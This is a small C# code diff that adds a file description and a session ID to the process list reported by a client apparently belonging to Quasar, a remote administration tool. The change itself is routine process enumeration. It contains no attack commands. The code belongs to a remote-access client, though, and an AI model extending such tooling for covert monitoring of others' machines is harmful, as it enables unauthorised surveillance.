@@ -81,6 +81,8 @@ namespace Quasar.Client.Messages
                         Id = pList[i].Id,
                         MainWindowTitle = pList[i].MainWindowTitle,
                         Path = pList[i].MainModule.FileName,
+                        Description= pList[i].MainModule.FileVersionInfo.FileDescription,
+                        SessionId = pList[i].SessionId,
                     };
 
                     Bitmap bmpIcon = GetSystemIconA.GetIconFromFile(pList[i].MainModule.FileName, GetSystemIconA.IMAGELIST_SIZE_FLAG.SHIL_SMALL).ToBitmap();
